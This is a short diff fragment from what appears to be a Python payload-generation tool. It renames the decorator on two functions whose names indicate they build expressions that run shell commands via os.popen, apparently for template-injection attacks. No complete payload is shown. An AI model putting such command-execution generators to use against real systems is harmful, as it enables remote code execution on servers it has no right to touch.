 
 
-@req_gen
+@expression_gen
 def gen_os_popen_read_normal2(context, cmd):
     return [
         (LITERAL, "("),
@@ -1594,7 +1681,7 @@ def gen_os_popen_read_normal2(context, cmd):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_os_popen_read_eval(context, cmd):
     return [
         (
